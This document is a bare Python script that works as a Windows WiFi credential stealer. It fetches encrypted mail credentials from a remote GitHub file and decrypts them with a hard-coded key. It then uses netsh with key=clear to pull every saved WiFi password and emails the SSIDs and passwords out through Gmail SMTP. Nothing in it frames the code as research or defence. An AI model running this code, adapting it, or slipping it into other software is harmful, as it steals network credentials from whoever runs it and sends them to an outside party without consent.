import subprocess
import re
import smtplib
from email.message import EmailMessage
from cryptography.fernet import Fernet
import requests

# URL of the config.enc file (replace with your actual URL)
config_url = 'https://raw.githubusercontent.com/JackBoxer/config_enc/main/config.enc'

# Fetch the encrypted config file from the URL
response = requests.get(config_url)
if response.status_code == 200:
    encrypted_config = response.text.split('\n')
    encrypted_user = encrypted_config[0].strip()
    encrypted_pass = encrypted_config[1].strip()
else:
    raise Exception(f"Failed to fetch config file: {response.status_code}")

# Encryption key (replace with the key printed during encryption)
encryption_key = b"rduBVNytF6JUB-a6jdk5kHaAUmh6u2QauHPB_d2mwzg="

# Initialize the cipher suite
cipher_suite = Fernet(encryption_key)

# Decrypt credentials
email_user = cipher_suite.decrypt(encrypted_user.encode()).decode()
email_pass = cipher_suite.decrypt(encrypted_pass.encode()).decode()

# Get WiFi profiles and passwords
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = re.findall("All User Profile     : (.*)\r", command_output)

wifi_list = []
if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = {}
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            wifi_profile["password"] = None if password is None else password[1]
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessage()
email["from"] = email_user
email["to"] = email_user
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server and send email with exception handling
try:
    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.set_debuglevel(0)  # Disable debugging
        smtp.ehlo()
        smtp.starttls()
        # Use the decrypted credentials to log in
        smtp.login(email_user, email_pass)
        smtp.send_message(email)
    print("Email sent successfully!")
except smtplib.SMTPException as e:
    print(f"Failed to send email: {e}")
